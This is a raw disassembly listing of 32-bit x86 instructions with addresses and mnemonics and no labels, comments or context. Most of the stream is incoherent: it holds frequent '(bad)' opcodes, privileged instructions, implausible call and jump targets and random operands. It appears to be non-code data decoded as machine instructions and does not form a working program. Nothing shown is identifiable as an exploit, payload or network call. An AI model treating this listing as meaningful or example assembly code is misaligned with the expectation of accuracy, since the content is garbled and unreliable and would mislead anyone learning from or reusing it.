  4321cb:	and    dh,cl
  4321cd:	call   0xc72a9d
  4321d2:	add    DWORD PTR [ebp+0x0],edx
  4321d5:	mov    esp,DWORD PTR [ebp+0x18]
  4321d8:	add    BYTE PTR [eax+0x50],cl
  4321db:	xor    eax,DWORD PTR [eax]
  4321dd:	add    esp,DWORD PTR [esi+0x3b]
  4321e0:	inc    ebp
  4321e1:	je     0x432166
  4321e3:	push   ecx
  4321e4:	dec    BYTE PTR [ebp-0x77]
  4321e7:	add    eax,esi
  4321e9:	or     al,0x5e
  4321eb:	inc    eax
  4321ec:	add    BYTE PTR [ebx],al
  4321ee:	data16 and BYTE PTR [ebp+0x50],al
  4321f2:	sub    DWORD PTR [ecx],0xfffffff8
  4321f5:	add    BYTE PTR [ebp-0x75],ah
  4321f8:	add    BYTE PTR [eax],bl
  4321fa:	enter  0x894d,0x8b
  4321fe:	int3   
  4321ff:	loopne 0x4321c3
  432201:	rol    BYTE PTR [eax],0x33
  432204:	lea    cx,[ebp+0xa]
  432208:	data16 jb 0x432250
  43220b:	add    BYTE PTR [ebx+0x44890855],cl
  432211:	sbb    ah,al
  432213:	inc    ebp
  432214:	cmp    al,0xf
  432216:	add    BYTE PTR [edx+0x66],dl
  432219:	xor    ecx,DWORD PTR [eax]
  43221b:	sub    eax,DWORD PTR [edx]
  43221d:	mov    eax,DWORD PTR [eax]
  43221f:	or     al,0x66
  432221:	ror    edx,cl
  432223:	dec    ebp
  432224:	inc    ebp
  432225:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43222b:	cld    
  43222c:	or     BYTE PTR [edi+0x4501dd],dl
  432232:	ret    0xecce
  432235:	retf   
  432236:	(bad)  
  432237:	dec    ebp
  432238:	mov    al,0x8b
  43223a:	loopne 0x43225c
  43223c:	cmp    ecx,DWORD PTR [edx]
  43223e:	inc    ebp
  43223f:	daa    
  432240:	loopne 0x4321c9
  432242:	in     al,dx
  432243:	add    edi,eax
  432245:	add    BYTE PTR [eax+0x3f52e155],bh
  43224b:	push   ebp
  43224c:	inc    ebp
  43224d:	xor    ebx,edx
  43224f:	add    ebp,esp
  432251:	push   edx
  432252:	push   bp
  432254:	inc    ebp
  432255:	(bad)  
  432256:	in     eax,dx
  432257:	push   esp
  432258:	(bad)  
  432259:	inc    edx
  43225b:	sbb    al,0x33
  43225d:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432264:	add    BYTE PTR [ebp+0x46],0x8b
  432268:	jmp    0xf98b:0x100041c8
  43226f:	xor    esi,DWORD PTR [edx+0x3]
  432272:	mov    ecx,DWORD PTR [edi]
  432274:	fmul   DWORD PTR [edx]
  432276:	add    BYTE PTR [eax],al
  432278:	lea    eax,[ebx-0x4700273c]
  43227e:	add    al,0x4f
  432280:	pop    DWORD PTR [eax]
  432282:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432288:	push   edx
  432289:	inc    WORD PTR [ebp+0x8]
  43228d:	mov    eax,0x514f4d
  432292:	(bad)
  432296:	add    al,al
  432298:	xor    DWORD PTR [ebx-0x74baf730],eax
  43229e:	test   DWORD PTR [esi+0x74],esp
  4322a1:	inc    ebp
  4322a2:	mov    DWORD PTR [eax+0xa4e08],edi
  4322a8:	add    BYTE PTR [ecx-0x76c435bb],cl
  4322ae:	or     dh,cl
  4322b0:	or     eax,0x8b8d5045
  4322b5:	inc    ebp
  4322b6:	mov    WORD PTR [ecx+0x3b8a00],?
  4322bc:	jne    0x4322f1
  4322be:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4322c4:	add    DWORD PTR [ebx],eax
  4322c6:	add    bh,bh
  4322c8:	adc    DWORD PTR [eax],ecx
  4322ca:	adc    DWORD PTR [ebp+0x55],edi
  4322cd:	push   es
  4322ce:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4322d4:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4322db:	inc    ebp
  4322dc:	mov    esp,edi
  4322de:	or     al,0xda
  4322e0:	push   eax
  4322e1:	(bad)  
  4322e2:	jne    0x432298
  4322e4:	call   0x3b1bd3
  4322e9:	inc    ebp
  4322ea:	sar    BYTE PTR [eax],0x84
  4322ed:	in     al,dx
  4322ee:	add    bh,al
  4322f0:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  4322f7:	(bad)  
  4322f8:	and    al,al
  4322fa:	fs in  eax,dx
  4322fc:	inc    DWORD PTR [ebp-0x7b]
  4322ff:	jle    0x432310
  432301:	leave  
  432302:	scas   al,BYTE PTR es:[edi]
  432303:	inc    esp
  432304:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43230b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432312:	call   DWORD PTR [edi]
  432314:	shr    ah,0x84
  432317:	xchg   DWORD PTR [eax],eax
  432319:	add    DWORD PTR [eax],eax
  43231b:	add    bh,bh
  43231d:	dec    ebp
  43231e:	and    BYTE PTR [ecx-0x38],dl
  432321:	push   eax
  432322:	dec    DWORD PTR [ebx+0xfd885]
  432328:	mov    BYTE PTR [ebp+0x508bac00],cl
  43232e:	mov    WORD PTR [ecx+0x0],ss
  432331:	lea    ecx,[ebx+0x108b20d8]
  432337:	mov    WORD PTR [edx],ds
  432339:	add    BYTE PTR [edi+0xff01ff],al
  43233f:	mov    ecx,DWORD PTR [ebp-0x28]
  432342:	push   ecx
  432343:	shl    BYTE PTR [ebp+0x3a],0x8b
  432347:	inc    ebp
  432348:	in     al,0xeb
  43234a:	jno    0x4322d7
  43234c:	push   edx
  43234d:	mov    DWORD PTR [eax-0x28],edx
  432350:	mov    eax,DWORD PTR [ebp+0x20]
  432353:	je     0x4322dc
  432355:	mov    eax,DWORD PTR [ecx]
  432357:	sbb    BYTE PTR [eax],al
  432359:	pop    DWORD PTR [eax]
  43235b:	add    esi,eax
  43235d:	add    bl,al
  43235f:	adc    DWORD PTR [edi],esi
  432361:	jmp    0x8bce73b3
  432366:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  43236d:	jne    0x4322fa
  43236f:	mov    ecx,DWORD PTR [eax]
  432371:	in     al,0x75
  432373:	pop    DWORD PTR [ecx+0x5401]
  432379:	push   edx
  43237a:	inc    DWORD PTR [ebx]
  43237c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432382:	add    BYTE PTR [edi+0x9],dl
  432385:	call   DWORD PTR [esi]
  432387:	and    dl,al
  432389:	and    bh,bh
  43238b:	inc    edi
  43238d:	test   eax,edx
  43238f:	sldt   ebx
  432392:	xor    al,BYTE PTR [eax]
  432394:	pushf  
  432395:	(bad)  
  432396:	jmp    0x4323a4
  432398:	mov    eax,edi
  43239a:	or     al,0x75
  43239c:	inc    eax
  43239d:	call   0x431aa5
  4323a2:	mov    eax,eax
  4323a4:	loopne 0x43232a
  4323a6:	inc    ebp
  4323a7:	add    BYTE PTR [ebx+0x1451c00],cl
  4323ad:	mov    eax,DWORD PTR [ebp+0x20]
  4323b0:	add    edi,ecx
  4323b2:	add    BYTE PTR [eax],ch
  4323b4:	cmp    edi,0x18
  4323b7:	test   DWORD PTR [ebp+0xf],esi
  4323ba:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4323c1:	jne    0x4323c5
  4323c3:	call   0xffa21e88
  4323c8:	leave  
  4323c9:	rcr    BYTE PTR [esp+eax*4],0x55
  4323cd:	add    ah,ch
  4323cf:	add    BYTE PTR [edi-0x48fef979],dh
  4323d5:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4323dc:	inc    esp
  4323dd:	mov    ebx,DWORD PTR [eax]
  4323df:	fcom   st(2)
  4323e1:	add    BYTE PTR [edi],bl
  4323e3:	lea    ecx,[eax-0x18]
  4323e6:	(bad)  
  4323e7:	push   DWORD PTR [ecx]
  4323e9:	call   0xffb5714b
  4323ee:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4323f2:	fstp   DWORD PTR [esi+ebx*8]
  4323f5:	push   ebp
  4323f6:	pop    ebp
  4323f7:	mov    esi,DWORD PTR [edx-0x38]
  4323fa:	add    DWORD PTR [eax],0x28
  4323fd:	mov    edi,DWORD PTR [ebx]
  4323ff:	xor    esi,DWORD PTR [edx+0x3]
  432402:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432406:	pop    ebp
  432407:	or     al,0x4
  432409:	inc    ecx
  43240a:	push   ebp
  43240b:	(bad)  
  43240c:	in     al,dx
  43240d:	or     ah,ch
  43240f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432410:	xbegin 0xffc89a06
  432416:	clc    
  432417:	adc    al,0x45
  432419:	div    BYTE PTR [edx]
  43241b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432422:	test   DWORD PTR [ebx+0x666300f8],ebx
  432428:	add    BYTE PTR [ecx+0x66],dh
  43242b:	add    eax,DWORD PTR [ebp+0x52]
  43242e:	adc    eax,0xffffffa0
  432431:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  432437:	test   DWORD PTR [eax],eax
  432439:	clc    
  43243a:	data16 or al,BYTE PTR [ebp+0x45]
  43243e:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432445:	rol    BYTE PTR [ebp+0x45],1
  432448:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  43244e:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432454:	push   ebx
  432455:	add    BYTE PTR [eax+eax*1+0x51],dl
  432459:	jge    0x43248e
  43245b:	add    BYTE PTR [esi+0x4],dl
  43245e:	jne    0x4324c5
  432460:	mov    edx,0x457200
  432465:	jmp    0x432429
  432467:	xor    edi,DWORD PTR [ebx]
  432469:	pop    edi
  43246a:	cvtdq2ps xmm7,xmm0
  43246d:	ret    0x0
  432470:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  432476:	xor    ecx,DWORD PTR [edi]
  432478:	add    eax,DWORD PTR [ecx+0x3b]
  43247b:	push   ebx
  43247c:	rdpmc  
  43247e:	out    0x8d,al
  432480:	add    BYTE PTR [eax],cl
  432482:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432488:	ret    0x450c
  43248b:	sbb    al,0x8b
  43248d:	cmp    eax,esi
  43248f:	or     cl,al
  432491:	or     al,0xc2
  432493:	pop    eax
  432494:	inc    ebp
  432495:	add    ecx,DWORD PTR [edi]
  432497:	add    esi,DWORD PTR [ebp+0x39]
  43249a:	invd   
  43249c:	jge    0x4324a8
  43249e:	mov    eax,0x478ac0
  4324a3:	cli    
  4324a4:	xor    esp,ecx
  4324a6:	mov    ebx,0x5b8ac0
  4324ab:	ret    0x33
  4324ae:	mov    eax,0x833b8b
  4324b3:	sub    BYTE PTR [ebx],al
  4324b5:	inc    ebp
  4324b6:	xor    ax,di
  4324b9:	pushf  
  4324ba:	inc    bh
  4324bc:	mov    esp,esp
  4324be:	hlt    
  4324bf:	test   DWORD PTR [ebp-0x8],esi
  4324c2:	mov    eax,DWORD PTR [ebp-0x14]
  4324c5:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4324cb:	dec    edi
  4324cc:	or     BYTE PTR [eax],al
  4324ce:	jne    0x432459
  4324d0:	mov    esi,esp
  4324d2:	call   0x77a9b097
  4324d7:	inc    ebp
  4324d8:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4324de:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4324e4:	add    BYTE PTR [esi+0x7d],ah
  4324e7:	inc    ebp
  4324e8:	mov    bx,WORD PTR [ebp+0x8]
  4324ec:	add    DWORD PTR [ebp+0x54],0x30c008b
  4324f3:	inc    ebp
  4324f4:	mov    bx,di
  4324f7:	lock test BYTE PTR [ecx+0x7000801],bh
  4324fe:	jge    0x4324c1
  432500:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432506:	cli    
  432507:	xor    bl,bh
  432509:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43250f:	test   BYTE PTR [eax],cl
  432511:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432518:	cmp    ebp,eax
  43251a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432521:	test   BYTE PTR [ebp+0x1],bh
  432524:	mov    ebx,0x458a00
  432529:	xor    esi,DWORD PTR [ebx]
  43252b:	add    esp,DWORD PTR [esi-0x77]
  43252e:	pop    ebp
  43252f:	loopne 0x432597
  432531:	inc    ebp
  432532:	clc    
  432533:	xor    edi,DWORD PTR [ebx]
  432535:	add    esi,DWORD PTR [edx-0x77]
  432538:	data16 fdivr QWORD PTR [ebp-0x49]
  43253c:	mov    ebx,0xb78afc
  432541:	hlt    
  432542:	xor    edi,DWORD PTR [esi+eiz*2]
  432545:	add    BYTE PTR [ebp+0x66],bl
  432548:	data16 lock clc 
  43254b:	cmp    al,0x3b
  43254d:	add    BYTE PTR [edi+0x66],dh
  432550:	psubq  mm7,QWORD PTR [ebp+0x2]
  432554:	ltr    WORD PTR [ebp+0x66]
  432558:	add    esi,eax
  43255a:	add    di,WORD PTR [ebp+0x2b]
  43255e:	data16 data16 jge 0x4325df
  432562:	mov    ebx,0xe08a8b
  432567:	jge    0x43259c
  432569:	data16 data16 xor al,0x5d
  43256d:	data16 data16 jne 0x432569
  432571:	mov    edi,DWORD PTR [ebx]
  432573:	fdiv   QWORD PTR [edx+0x7d]
  432576:	data16 data16 jge 0x4325ae
  43257a:	mov    ebx,0x758a66
  43257f:	mov    esi,0x667233
  432584:	pop    ebp
  432585:	or     BYTE PTR [esi+0x0],ah
  432588:	clc    
  432589:	mov    edi,DWORD PTR [ebx]
  43258b:	lock ja 0x432519
  43258e:	(bad)  
  432590:	jge    0x432589
  432592:	invd   
  432594:	pop    ebp
  432595:	add    BYTE PTR [ebx],al
  432597:	(bad)  
  432598:	cmp    di,WORD PTR [ebp+0xf]
  43259c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4325a0:	mov    bx,WORD PTR [ebp-0x10]
  4325a4:	pop    bp
  4325a6:	fbstp  TBYTE PTR [ebx]
  4325a8:	test   DWORD PTR [ebx],eax
  4325aa:	add    BYTE PTR [ebx],bh
  4325ac:	add    BYTE PTR [esi+0x7d],ah
  4325af:	jge    0x43253c
  4325b1:	data16 in al,dx
  4325b3:	pop    ebp
  4325b4:	stc    
  4325b5:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4325bc:	mov    edi,ebx
  4325be:	in     al,dx
  4325bf:	test   BYTE PTR [ebp+0x0],bh
  4325c2:	mov    eax,DWORD PTR [eax]
  4325c4:	call   0xbd401f54
  4325c9:	cmp    al,0x9b
  4325cb:	add    BYTE PTR [edx],dh
  4325cd:	mov    bx,di
  4325d0:	call   0x8b4ba360
  4325d5:	add    ebp,esp
  4325d7:	mov    bx,di
  4325da:	jnp    0x432602
  4325dc:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4325e2:	mov    eax,DWORD PTR [eax]
  4325e4:	call   0x7c3eb14f
  4325e9:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4325ef:	data16 data16 fistp WORD PTR [ebp+0xe]
  4325f4:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  4325fe:	fisttp WORD PTR [ecx-0x7401f77b]
  432604:	(bad)  
  432605:	cld    
  432606:	jne    0x432644
  432608:	xor    eax,DWORD PTR [eax]
  43260a:	mov    esp,DWORD PTR [esi-0x10]
  43260d:	sti    
  43260e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432615:	data16 adc bl,bh
  432618:	push   ebp
  432619:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432620:	mov    WORD PTR [eax],es
  432622:	fwait
  432623:	data16 xor bh,bl
  432626:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  43262c:	mov    esp,DWORD PTR [esi-0x14]
  43262f:	fisttp WORD PTR [ebx-0x3748a9f2]
  432635:	or     al,0x2b
  432637:	mov    bh,0xba
  432639:	hlt    
  43263a:	mov    bh,bl
  43263c:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432642:	dec    esi
  432643:	or     al,0x0
  432645:	mov    edi,DWORD PTR [ebx]
  432647:	or     BYTE PTR [ebp+0x3b],dh
  43264a:	mov    ecx,DWORD PTR [edi]
  43264c:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432652:	xor    al,0xd8
  432654:	pop    bp
  432656:	lock xor esi,DWORD PTR [ebx]
  432659:	lea    esp,[esi+0x1f]
  43265c:	icebp  
  43265d:	jb     0x432663
  43265f:	add    al,al
  432661:	jge    0x43266f
  432663:	mov    eax,eax
  432665:	fsubr  st,st(3)
  432667:	pop    ebp
  432668:	mov    esi,DWORD PTR [ebx]
  43266a:	in     al,0x8d
  43266c:	rcr    DWORD PTR [edi],0xc2
  43266f:	jb     0x4326cf
  432671:	add    cl,cl
  432673:	jge    0x432681
  432675:	mov    edx,DWORD PTR [ebp-0x20]
  432678:	in     al,dx
  432679:	pop    ebp
  43267a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  43267f:	cmp    di,WORD PTR [ebp+0x0]
  432683:	mov    ebp,DWORD PTR [ebx]
  432685:	fdivr  QWORD PTR [esi+0x668a5d]
  43268b:	cmp    al,0x33
  43268d:	mov    si,0x4e7d
  432691:	mov    eax,DWORD PTR [eax]
  432693:	lock inc ebp
  432695:	mov    esi,DWORD PTR [eax]
  432697:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43269e:	clc    
  43269f:	(bad)  
  4326a0:	cmp    edi,DWORD PTR [ebx]
  4326a2:	je     0x4326b3
  4326a4:	push   ebx
  4326a5:	loopne 0x4326b6
  4326a7:	dec    ecx
  4326a9:	mov    esp,DWORD PTR [ebp-0x1c]
  4326ac:	int    0xf1
  4326ae:	mov    esi,0x703084d
  4326b3:	pcmpgtd mm6,mm1
  4326b6:	add    BYTE PTR [ebp+0x66],dh
  4326b9:	jmp    0x432686
  4326bb:	mov    eax,DWORD PTR [ebx]
  4326bd:	lock push ebp
  4326bf:	ror    DWORD PTR [ebp-0x2972feb3],1
  4326c5:	or     bh,dl
  4326c7:	jb     0x4326c7
  4326c9:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4326cf:	loopne 0x4326d1
  4326d1:	jne    0x4326d5
  4326d3:	data16 add BYTE PTR [esi+eiz*2],dh
  4326d7:	mov    ecx,ebx
  4326d9:	data16 cmp al,0xf1
  4326dc:	add    BYTE PTR [esi+eiz*2],bh
  4326df:	add    bl,cl
  4326e1:	retw   0xf2
  4326e5:	ret    0x66
  4326e8:	retf   
  4326e9:	enterw 0x4df1,0x19
  4326ee:	pop    edi
  4326ef:	jne    0x432672
  4326f1:	mov    esi,DWORD PTR [eax]
  4326f3:	call   0x77b7b294
  4326f8:	xor    ebp,DWORD PTR [ebx]
  4326fa:	lea    esp,[esi+0x48]
  4326fd:	repnz in eax,0x3b
  432700:	add    BYTE PTR [ebp-0x37],dh
  432703:	xor    edx,DWORD PTR [ebp-0x15]
  432706:	in     al,dx
  432707:	xor    edx,DWORD PTR [esi+0x40]
  43270a:	mov    DWORD PTR [edi],0x338545fc
  432710:	clc    
  432711:	add    esi,DWORD PTR [ecx]
  432713:	pop    edi
  432714:	pushf  
  432715:	pop    ebx
  432716:	call   0xff4426dd
  43271b:	mov    edi,eax
  43271d:	push   ecx
  43271e:	pop    es
  43271f:	mov    edi,DWORD PTR [eax]
  432721:	push   esi
  432722:	inc    esi
  432723:	add    bh,BYTE PTR [esi+0x0]
  432726:	popa   
  432727:	data16 (bad) 
  432729:	into   
  43272a:	gs cmp al,0xcd
  43272d:	add    BYTE PTR [ecx+0x7ce0866],bh
  432733:	ret    0x66
  432736:	add    bh,al
  432738:	add    bh,ah
  43273a:	add    BYTE PTR [ebp+0x31c3f866],al
  432740:	cmp    al,0x9c
  432742:	add    BYTE PTR [esi+0x66],ah
  432745:	into   
  432746:	ret    
  432747:	pop    ebp
  432748:	adc    BYTE PTR [edi+0x0],dl
  43274b:	mov    bh,0x66
  43274d:	mov    edi,0xff038dc3
  432752:	jne    0x4327a8
  432754:	lea    edx,[ecx+0x1]
  432757:	mov    ebx,0xd64ff1
  43275c:	sar    DWORD PTR [ebx],1
  43275e:	test   BYTE PTR [ebp+0x36],dh
  432761:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432765:	push   edi
  432766:	xor    BYTE PTR [ebx],0x38
  432769:	mov    esi,ebx
  43276b:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432771:	ss inc ebp
  432773:	fs pop ebx
  432775:	mov    ebx,0x9c3b30
  43277a:	je     0x4327a7
  43277c:	xor    edi,DWORD PTR [ebx+0x668a33]
  432782:	mov    WORD PTR [ebx],?
  432784:	ss mov ebx,0x8b4e64
  43278a:	pop    edi
  43278b:	cmp    ecx,ecx
  43278d:	jne    0x4327e4
  43278f:	mov    ebp,esp
  432791:	cld    
  432792:	push   esi
  432793:	pop    ebx
  432794:	inc    ebp
  432795:	stc    
  432796:	xor    BYTE PTR [ebp+0x9bef89c],al
  43279c:	test   esi,ecx
  43279e:	clc    
  43279f:	test   dl,dl
  4327a1:	cmp    bh,bh
  4327a3:	fs pop si
  4327a6:	or     bl,al
  4327a8:	add    cl,BYTE PTR [ebx+0x57665100]
  4327ae:	retf   0x3c45
  4327b1:	xor    BYTE PTR [eax],al
  4327b3:	pushf  
  4327b4:	mov    si,0x85ca
  4327b8:	ret    0xf8
  4327bb:	pop    ebx
  4327bc:	dec    dx
  4327bf:	mov    edx,DWORD PTR [edi-0x76]
  4327c2:	push   edi
  4327c3:	add    al,0xb7
  4327c5:	xor    al,0xba
  4327c7:	cmp    al,0x8d
  4327c9:	je     0x4327ca
  4327cb:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4327cf:	lea    edi,[ebx+0x544fff]
  4327d5:	push   ecx
  4327d6:	cmp    edx,DWORD PTR [ebx+0x75]
  4327d9:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4327df:	add    BYTE PTR [ebx],dh
  4327e1:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4327e7:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  4327ee:	mov    ebx,0x3b3b00
  4327f3:	jne    0x432820
  4327f5:	mov    DWORD PTR [ebx+0x728afc],edi
  4327fb:	xor    esi,DWORD PTR [ebx]
  4327fd:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432803:	push   edi
  432804:	cmp    esp,ebp
  432806:	jne    0x432808
  432808:	sbb    DWORD PTR [eax],0x8085c3fc
  43280e:	clc    
  43280f:	inc    esi
  432810:	pop    ebx
  432811:	sti    
  432812:	add    eax,0xeb8bc075
  432817:	cld    
  432818:	xor    edi,DWORD PTR ds:0xf8c3855e
  43281e:	mov    ecx,DWORD PTR [ecx+edx*2]
  432821:	rol    DWORD PTR [ebp-0x37],0xf
  432825:	mov    DWORD PTR [eax],ecx
  432827:	inc    edi
  432828:	(bad)  
  432829:	in     eax,0xfe
  43282b:	add    bh,bh
  43282d:	(bad)  
  43282e:	mov    esi,0xc38a5e
  432833:	mov    esi,DWORD PTR [ebx]
  432835:	push   ecx
  432836:	mov    edi,0xfc4ec7
  43283b:	test   DWORD PTR [ebp-0x8],edx
  43283e:	xor    di,ax
  432841:	pushf  
  432842:	sub    ebp,eax
  432844:	inc    ebp
  432845:	(bad)  
  432846:	sub    edi,edi
  432848:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  43284e:	inc    ebp
  43284f:	add    BYTE PTR [esi+0x2b],ah
  432852:	or     bh,BYTE PTR [edx+0xf8ac2]
  432858:	cmp    al,0x33
  43285a:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432860:	(bad)  
  432861:	cmp    esi,DWORD PTR [ebx]
  432863:	je     0x43281d
  432865:	push   ebx
  432866:	dec    esi
  432867:	str    ecx
  43286a:	cmp    esp,DWORD PTR [ebp+0x75]
  43286d:	int    0x33
  43286f:	mov    edi,0x789085f
  432874:	mov    edx,DWORD PTR [eax]
  432876:	cld    
  432877:	add    cl,cl
  432879:	data16 add al,0xcb
  43287c:	push   ebp
  43287d:	add    ebp,esp
  43287f:	jne    0x43286d
  432881:	(bad)  
  432882:	mov    DWORD PTR [ecx],0xd685f7ec
  432888:	clc    
  432889:	xlat   BYTE PTR ds:[ebx]
  43288a:	inc    ebp
  43288b:	mov    esi,DWORD PTR [edx]
  43288d:	push   eax
  43288e:	pushf  
  43288f:	in     eax,0x8b
  432891:	add    ah,ch
  432893:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432897:	add    ax,0x72cb
  43289b:	cmp    al,0x0
  43289d:	add    BYTE PTR [ebp+0x66],al
  4328a0:	(bad)  
  4328a1:	retf   
  4328a2:	lock ret 0x85
  4328a6:	clc    
  4328a7:	inc    bp
  4328a9:	retf   
  4328aa:	cmp    eax,0xc77d9cc8
  4328af:	xor    ah,bh
  4328b1:	pushf  
  4328b2:	test   DWORD PTR [edi-0x8],ebx
  4328b5:	je     0x4328fc
  4328b7:	xor    esi,DWORD PTR ds:0x7020840
  4328bd:	ror    BYTE PTR [ebp-0x37],0x8d
  4328c1:	push   ebp
  4328c2:	add    esp,ebp
  4328c4:	jb     0x432851
  4328c6:	add    BYTE PTR [eax],cl
  4328c8:	dec    ebp
  4328c9:	mov    bh,0x81
  4328cb:	push   esi
  4328cc:	push   esp
  4328cd:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4328d4:	xor    al,BYTE PTR [eax]
  4328d6:	mov    edx,DWORD PTR [edi+0x10]
  4328d9:	(bad)  
  4328da:	scas   eax,DWORD PTR es:[edi]
  4328db:	ret    0x3b
  4328de:	jns    0x3b4425d1
  4328e4:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4328e8:	dec    ebp
  4328e9:	or     BYTE PTR [ebx],ch
  4328eb:	ret    0x458b
  4328ee:	lock jmp 0x4328e2
  4328f1:	mov    ecx,DWORD PTR [eax]
  4328f3:	or     BYTE PTR [edi],al
  4328f5:	mov    ecx,eax
  4328f7:	xor    DWORD PTR [edx+0x2],0x0
  4328fb:	mov    bh,0xc1
  4328fd:	adc    BYTE PTR [eax],dh
  4328ff:	iret   
  432900:	inc    ebp
  432901:	mov    DWORD PTR [ebx],0x4dfff8c4
  432907:	inc    BYTE PTR [ebx]
  432909:	ret    0xf8
  43290c:	adc    DWORD PTR [esi+0x10],esp
  43290f:	clc    
  432910:	dec    ecx
  432911:	fisttp WORD PTR [ecx+0x456604c0]
  432917:	add    dh,BYTE PTR ds:0x75e0845
  43291d:	ret    0x4d
  432920:	lea    ecx,[ebx+0x18728301]
  432926:	add    BYTE PTR [ebp+0x45],al
  432929:	xor    ecx,ebp
  43292b:	pushf  
  43292c:	add    bh,al
  43292e:	add    al,ch
  432930:	inc    ebp
  432931:	test   DWORD PTR [ebx-0x3eba0708],ecx
  432937:	xor    eax,0x781084d
  43293c:	push   esp
  43293d:	fwait
  43293e:	push   ecx
  43293f:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432945:	inc    ebp
  432946:	cmp    edi,DWORD PTR [ecx]
  432948:	jbe    0x4328e6
  43294a:	mov    eax,edi
  43294c:	or     ah,dh
  43294e:	inc    ebp
  43294f:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432955:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43295b:	in     al,dx
  43295c:	hlt    
  43295d:	push   esp
  43295e:	push   esp
  43295f:	push   ecx
  432960:	push   ecx
  432961:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  432967:	fwait
  432968:	fwait
  432969:	xor    dh,BYTE PTR [edx]
  43296b:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432971:	or     BYTE PTR [ebp+0x7],al
  432974:	mov    eax,ecx
  432976:	clc    
  432977:	jb     0x43293a
  432979:	add    BYTE PTR [ebp+0x55],cl
  43297c:	or     DWORD PTR [edi],0xc251d154
  432982:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  43298c:	mov    edi,eax
  43298e:	or     cl,al
  432990:	inc    ebp
  432991:	dec    ebp
  432992:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432998:	or     WORD PTR [ecx],0x899b
  43299d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4329a3:	mov    edx,DWORD PTR [ecx+0x8]
  4329a6:	mov    eax,DWORD PTR [ebp-0x8]
  4329a9:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4329b0:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4329b6:	inc    ebp
  4329b7:	dec    eax
  4329b8:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4329be:	add    edx,DWORD PTR [ecx-0x8]
  4329c1:	mov    ecx,DWORD PTR [ecx]
  4329c3:	clc    
  4329c4:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4329cb:	mov    ecx,ebp
  4329cd:	clc    
  4329ce:	(bad)  
  4329cf:	popf   
  4329d0:	inc    DWORD PTR [eax]
  4329d2:	ret    0x8b
  4329d5:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4329db:	mov    edi,esp
  4329dd:	hlt    
  4329de:	test   ecx,esi
  4329e0:	clc    
  4329e1:	or     BYTE PTR [ebp+0x7],al
  4329e4:	xor    al,cl
  4329e6:	pushf  
  4329e7:	jb     0x432a1c
  4329e9:	add    BYTE PTR [eax-0x3f],al
  4329ec:	inc    eax
  4329ed:	daa    
  4329ee:	inc    ebp
  4329ef:	inc    ebp
  4329f0:	xor    eax,0x7f80803
  4329f5:	dec    ebp
  4329f6:	fwait
  4329f7:	add    esi,DWORD PTR [edx]
  4329f9:	clc    
  4329fa:	cmp    DWORD PTR [ecx],ecx
  4329fc:	or     al,0x8
  4329fe:	add    al,BYTE PTR [ebp+0x2c]
  432a01:	xor    eax,0x7350845
